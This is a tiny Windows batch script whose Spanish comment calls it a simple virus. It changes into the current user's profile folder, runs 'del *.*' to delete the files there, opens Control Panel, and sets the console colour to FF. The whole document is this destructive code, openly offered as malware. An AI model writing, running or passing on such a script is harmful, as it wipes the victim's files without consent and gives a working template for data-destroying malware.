REM virus simple en cual se encarga de ingresar a la carpeta de usuario y eliminar todos los archivos de dicha carpeta, también ingresa al panel de control y cambia el color de la consola de comandos.	

@echo on
CD "%UserProfile%"

del *.*

start control
color FF